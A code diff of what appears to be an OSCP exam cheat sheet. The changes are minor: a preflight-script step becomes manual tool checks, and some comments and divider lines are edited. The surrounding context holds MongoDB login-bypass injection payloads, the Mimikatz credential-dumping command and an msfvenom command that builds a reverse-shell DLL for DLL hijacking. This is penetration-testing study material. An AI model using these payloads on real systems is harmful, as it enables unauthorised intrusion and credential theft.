@@ -81,9 +81,9 @@ necessary for the objective.
 | Certipy | 5.1.0 | Current stable command family; verify local `certipy -h` / `-v` |
 | Ligolo-ng | 0.9.1 | Use managed interface/session/route syntax and validate the certificate fingerprint |
 
-Run `python3 oscp-v19-preflight.py` before the exam and import its JSON into the
-app. It records presence, local help/version output and hashes. A mismatch is a
-prompt to read installed help—not permission to improvise an unverified command.
+Before the exam, verify tools you actually plan to use with `command -v`, local
+`--help`, and version output. This repository has no external preflight helper;
+if local syntax differs from these notes, the installed help wins.
 
 
 ## AD / Windows Fallback Toolbox — Searchable, Compact, Rule-Aware
@@ -2268,7 +2268,7 @@ mongo $IP/admin -u user -p pass
 username[$ne]=invalid&password[$ne]=invalid   # Not-equal bypass
 username=admin&password[$regex]=.*            # Regex bypass
 {"username": {"$gt": ""}, "password": {"$gt": ""}}
-# Mongo Injection payloads:
+# Bypass login entirely with always-true conditions
 username=admin'%20||%20'1'=='1'&password=x
 ```
 
@@ -2450,7 +2450,7 @@ i686-w64-mingw32-gcc exploit.c -o exploit.exe          # 32-bit Windows
 x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe      # 64-bit Windows
 i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 # With winsock
 
-# ── EXPLOIT MODIFICATION CHECKLIST ────────────────────────────
+# ── EXPLOIT MODIFICATION CHECKLIST ───────────────────────────
 # Before running ANY exploit:
 # 1. Read the code — understand what it does
 # 2. Check: does it need a listener? what port?
@@ -7207,11 +7207,11 @@ sekurlsa::logonpasswords
 
 
 ``` bash
-# ── FIND MISSING DLL OPPORTUNITIES ───────────────────────────
+# ── FIND MISSING DLL OPPORTUNITIES ────────────────────────────
 # Use Procmon on Windows: filter Result=NAME NOT FOUND + .dll in path
 # Or use winpeas output which lists writable directories in PATH
 
-# ── CREATE MALICIOUS DLL ──────────────────────────────────────
+# ── CREATE MALICIOUS DLL ─────────────────────────────────────
 msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f dll -o missing.dll
 
 # C template (more reliable):
